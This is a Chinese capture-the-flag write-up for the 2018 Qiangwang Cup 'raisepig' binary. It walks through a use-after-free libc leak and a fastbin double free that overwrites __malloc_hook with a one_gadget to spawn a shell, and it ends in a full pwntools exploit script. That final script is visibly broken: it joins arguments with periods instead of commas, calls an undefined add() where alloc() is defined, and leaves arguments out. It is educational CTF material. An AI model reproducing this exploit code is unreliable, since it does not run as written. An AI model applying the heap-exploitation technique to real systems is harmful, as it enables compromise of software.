# 2018强网杯--pwn--raisepig

checksec

```
	Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

full relro: got表保护

ida打开

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]
  __int64 savedregs; // [rsp+30h] [rbp+0h]

  v4 = __readfsqword(0x28u);
  sub_1160(a1, a2, a3);
  while ( 1 )
  {
    sub_B90();
    read(0, &buf, 8uLL);
    atoi(&buf);
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        newpig(&buf, &buf);
        break;
      case 2u:
        showpig(&buf, &buf);
        break;
      case 3u:
        deletepig(&buf, &buf);
        break;
      case 4u:
        freepigs(&buf, &buf);
        break;
      case 5u:
        puts("See you next time.");
        exit(0);
        return;
      default:
        puts("Invalid choice");
        break;
    }
  }
}
```

```c
v0 = __readfsqword(0x28u);
  puts(&s);
  puts("            ,-,------, ");
  puts("          _ \\(\\(_,--'  ");
  puts("     <`--'\\>/(/(__     ");
  puts("     /. .  `'` '  \\    ");
  puts("    ('')  ,        @   ");
  puts("     `-._,        /    ");
  puts("        )-)_/--( >     ");
  puts("       ''''  ''''      ");
  puts(&s);
  puts("1 . Raise a pig ");
  puts("2 . Visit pigs ");
  puts("3 . Eat a pig");
  puts("4 . Eat the whole Pig Farm");
  puts("5 . Leave the Farm");
  puts(&s);
  printf("Your choice : ");
  return __readfsqword(0x28u) ^ v0;
```

无法解析伪c代码，只能看汇编了

难受，直接运行起来，看看内存分配

```
0x0000000000000000	0x0000000000000041
0x55d20b463050:	0x000055d20b4630b0	0x6161616161616161
0x55d20b463060:	0x6161616161616161	0x6161616161616161
0x55d20b463070:	0x6161616161616161	0x6161616161616161
0x55d20b463080:	0x0000000000000000	0x0000000000000031
0x55d20b463090:	0x0000000000000000	0x000055d20b4630c0
0x55d20b4630a0:	0x0000000000000032	0x0000000000000000
0x55d20b4630b0:	0x0000000000000000	0x0000000000000041
0x55d20b4630c0:	0x0000000000000000	0x6262626262626262
0x55d20b4630d0:	0x6262626262626262	0x6262626262626262
0x55d20b4630e0:	0x6262626262626262	0x6262626262626262
0x55d20b4630f0:	0x0000000000000000	0x0000000000000031
0x55d20b463100:	0x0000000000000001	0x000055d20b463130
0x55d20b463110:	0x0000000000000033	0x0000000000000000
0x55d20b463120:	0x0000000000000000	0x0000000000000041
0x55d20b463130:	0x6363636363636363	0x6363636363636363
0x55d20b463140:	0x6363636363636363	0x6363636363636363
0x55d20b463150:	0x6363636363636363	0x6363636363636363
0x55d20b463160:	0x0000000000000000	0x000000000001fea1
```

type和name指针保存在一个0x20堆，下一个就是保存name的堆

删除堆，发现是free掉name的堆，而且指针没有清除.

## 利用思路：

1.泄露libc地址，并通过偏移计算出__malloc_hook函数地址，one_gadget获得的system"/bin/sh"的地址。

```python
add(0x80,"AAAA","aa")
add(0x20,"BBBB","bb")
eat(0)

add(0x50,'','dd')

show()

p.recvuntil("Name[2] :")
data =u64(p.recv(6).ljust(8,'\x00'))
print"data=",hex(data)
```


2.修改__malloc_hook函数的地址为我们的system"/bin/sh"的地址

double free

通过double free来伪造fd，使fd指向malloc_hook前两个左右字节附近的地方（伪堆）（注意是附近哦，后面还会有size的安全检查），使申请的伪堆的data处为__malloc_hook函数的地址，这样修改data就修改了malloc_hook函数的内容了。

```python
add(0x60,"CCCC","cccc")
add(0x60,"DDDD","dddd")
add(0x60,"EEEE","eeee")  #防止最后一个堆free时与topchunk合并

eat(3)
eat(4)
eat(3)

add(0x60,p64(malloc_hook - 0x13),"ff")   #把chunk3的fd改为malloc
add(0x60,"gggg","gg")      #chunk4->fd指向chunk3，填补chunk4
add(0x60,"hhhh","hh")      #chunk3->fd指向malloc，chunk3又被改写

add(0x60,'\x00\x00\x00'+p64(one),"iiii")   #改写malloc
```

3.double free 触发__malloc_hook执行，便会转换到执行我们的shell。
	free两次
getshell
exp:

```python
from pwn import *

r=process("./raisepig")
print util.proc.pidof(r)

def alloc(length,name,pty):
	r.recvuntil("Your choice : ")
	r.sendline("1")
	r.recvuntil("Length of the name :")
	r.sendline(str(length))
	r.recvuntil("The name of pig :")
	r.sendline(name)
	r.recvuntil("The type of the pig :")
	r.sendline(pty)

def show():
	r.recvuntil("Your choice : ")
	r.sendline("2")

def eat(idd):
	r.recvuntil("Your choice : ")
	r.sendline("3")
	r.recvuntil("Which pig do you want to eat:")
	r.sendline(str(idd))

alloc(0x80,"aaaa","aa")
alloc(0x20,'bbbb',"bb")
eat(0)
alloc(0x50,'',"cc")
show()
r.recvuntil("Name[2] :")
data = u64(r.recv(6).ljust(8,'\x00'))
print hex(data)

libc = data - 0x3c4b0a
one = libc + 0x45216
malloc_addr = libc + 0x3c4b10

alloc(0x60,"cccc"."cc")
alloc(0x60,"dddd"."dd")
alloc(0x60,"eeee"."ee")

eat(3)
eat(4)
eat(3)

add(0x60,p64(malloc_addr - 0x13))
add(0x60,"gggg","gg")
add(0x60,"ffff","ff")

add(0x60,'\x00\x00\x00'+p64(one),"ii")
eat(0)
eat(0)

r.interactive()
```

